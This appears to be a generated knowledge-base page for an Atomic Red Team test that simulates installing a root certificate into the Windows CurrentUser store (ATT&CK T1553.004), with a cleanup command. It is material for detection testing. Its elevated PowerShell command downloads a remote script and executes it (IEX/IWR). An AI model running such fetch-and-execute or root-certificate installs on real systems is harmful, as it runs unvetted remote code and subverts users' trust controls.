---
atomic_guid: "ca20a3f1-42b5-4e21-ad3f-1049199ec2e0"
title: "Add Root Certificate to CurrentUser Certificate Store"
framework: "atomic"
generated: "true"
attack_technique_id: "T1553.004"
attack_technique_name: "Subvert Trust Controls: Install Root Certificate"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1553.004/T1553.004.yaml"
build_date: "2026-04-26 17:02:13"
executor: "powershell"
aliases:
  - "ca20a3f1-42b5-4e21-ad3f-1049199ec2e0"
  - "Add Root Certificate to CurrentUser Certificate Store"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Add Root Certificate to CurrentUser Certificate Store

The following Atomic test simulates adding a generic non-malicious certificate to the CurrentUser certificate store. This behavior generates a registry modification that adds the cloned root CA certificate in the keys outlined in the blog.
Keys will look like - \SystemCertificates\CA\Certificates or \SystemCertificates\Root\Certificates
Reference: https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec

## Metadata

- Atomic GUID: ca20a3f1-42b5-4e21-ad3f-1049199ec2e0
- Technique: T1553.004: Subvert Trust Controls: Install Root Certificate
- Platforms: windows
- Executor: powershell
- Elevation Required: True
- Source Path: atomics/T1553.004/T1553.004.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1553-subvert_trust_controls|T1553.004]]

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing)
```

### Cleanup

```powershell
Get-ChildItem -Path Cert:\ -Recurse | Where-Object { $_.Thumbprint -eq '1F3D38F280635F275BE92B87CF83E40E40458400' } | remove-item
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1553.004/T1553.004.yaml)
